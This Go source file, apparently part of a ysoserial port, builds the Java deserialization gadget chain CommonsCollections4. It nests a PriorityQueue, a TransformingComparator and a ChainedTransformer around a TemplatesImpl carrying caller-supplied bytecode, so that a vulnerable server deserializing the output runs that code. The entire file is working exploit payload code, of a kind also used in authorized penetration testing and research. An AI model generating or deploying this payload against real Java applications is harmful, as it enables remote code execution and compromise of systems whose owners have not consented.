package ysoserial

func CommonsCollections4(bytecodes []byte) []byte {
	return ClassObject{
		name:             "java.util.PriorityQueue",
		serialVersionUID: -7720805057305804111,
		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
		fields: []Field{
			{Integer, "size", 2},
			{"Ljava/util/Comparator;", "comparator", ClassObject{
				name:             "org.apache.commons.collections4.comparators.TransformingComparator",
				serialVersionUID: 3456940356043606220,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/util/Comparator;", "decorated", ClassObject{
						name:              "org.apache.commons.collections4.comparators.ComparableComparator",
						serialVersionUID:  -291439688585137865,
						classDescFlags:    SC_SERIALIZABLE,
						fields:            []Field{},
						classAnnotations:  interfaces(),
						super:             nil,
						objectAnnotations: interfaces(),
					},
					},
					{"Lorg/apache/commons/collections4/Transformer;", "transformer", ClassObject{
						name:             "org.apache.commons.collections4.functors.ChainedTransformer",
						serialVersionUID: 3514945074733160196,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{"[Lorg/apache/commons/collections4/Transformer;", "iTransformers", ArrayObject{
								name:             "[Lorg.apache.commons.collections4.Transformer;",
								serialVersionUID: 4143657982017290149,
								classDescFlags:   SC_SERIALIZABLE,
								values: interfaces(
									ClassObject{
										name:             "org.apache.commons.collections4.functors.ConstantTransformer",
										serialVersionUID: 6374440726369055124,
										classDescFlags:   SC_SERIALIZABLE,
										fields: []Field{
											{"Ljava/lang/Object;", "iConstant", ClassDesc{
												name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter",
												serialVersionUID: 0,
												classDescFlags:   0x00,
											},
											},
										},
										classAnnotations:  interfaces(),
										super:             nil,
										objectAnnotations: interfaces(),
									}, ClassObject{
										name:             "org.apache.commons.collections4.functors.InstantiateTransformer",
										serialVersionUID: 3786388740793356347,
										classDescFlags:   SC_SERIALIZABLE,
										fields: []Field{
											{"[Ljava/lang/Object;", "iArgs", ArrayObject{
												name:             "[Ljava.lang.Object;",
												serialVersionUID: -8012369246846506644,
												classDescFlags:   SC_SERIALIZABLE,
												values: interfaces(
													ClassObject{
														name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
														serialVersionUID: 673094361519270707,
														classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
														fields: []Field{
															{Integer, "_indentNumber", 0},
															{Integer, "_transletIndex", -1},
															{Boolean, "_useServicesMechanism", false},
															{"Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;", "_auxClasses", nil},
															{"[[B", "_bytecodes", ArrayObject{
																name:             "[[B",
																serialVersionUID: 5475560301672258359,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	ArrayObject{
																		name:             "[B",
																		serialVersionUID: -5984413125824719648,
																		classDescFlags:   SC_SERIALIZABLE,
																		values:           bytesToInterfaces(bytecodes),
																		annotations:      interfaces(),
																	},
																),
																annotations: interfaces(),
															},
															},
															{"[Ljava/lang/Class;", "_class", nil},
															{"Ljava/lang/String;", "_name", "Pwnr"},
															{"Ljava/util/Properties;", "_outputProperties", nil},
														},
														classAnnotations: interfaces(),
														super:            nil,
														objectAnnotations: interfaces(
															blockData{0x00},
														),
													},
												),
												annotations: interfaces(),
											},
											},
											{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
												name:             "[Ljava.lang.Class;",
												serialVersionUID: -6118465897992725863,
												classDescFlags:   SC_SERIALIZABLE,
												values: interfaces(
													ClassDesc{
														name:             "javax.xml.transform.Templates",
														serialVersionUID: 0,
														classDescFlags:   0x00,
													},
												),
												annotations: interfaces(),
											},
											},
										},
										classAnnotations:  interfaces(),
										super:             nil,
										objectAnnotations: interfaces(),
									},
								),
								annotations: interfaces(),
							},
							},
						},
						classAnnotations:  interfaces(),
						super:             nil,
						objectAnnotations: interfaces(),
					},
					},
				},
				classAnnotations:  interfaces(),
				super:             nil,
				objectAnnotations: interfaces(),
			},
			},
		},
		classAnnotations: interfaces(),
		super:            nil,
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x03},
			ClassObject{
				name:             "java.lang.Integer",
				serialVersionUID: 1360826667806852920,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{Integer, "value", 1},
				},
				classAnnotations: interfaces(),
				super: &ClassObject{
					name:              "java.lang.Number",
					serialVersionUID:  -8742448824652078965,
					classDescFlags:    SC_SERIALIZABLE,
					fields:            []Field{},
					classAnnotations:  interfaces(),
					super:             nil,
					objectAnnotations: interfaces(),
				},
				objectAnnotations: interfaces(),
			},

			ClassObject{
				name:             "java.lang.Integer",
				serialVersionUID: 1360826667806852920,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{Integer, "value", 1},
				},
				classAnnotations: interfaces(),
				super: &ClassObject{
					name:              "java.lang.Number",
					serialVersionUID:  -8742448824652078965,
					classDescFlags:    SC_SERIALIZABLE,
					fields:            []Field{},
					classAnnotations:  interfaces(),
					super:             nil,
					objectAnnotations: interfaces(),
				},
				objectAnnotations: interfaces(),
			},
		),
	}.SerializeWithMagicHeader()
}
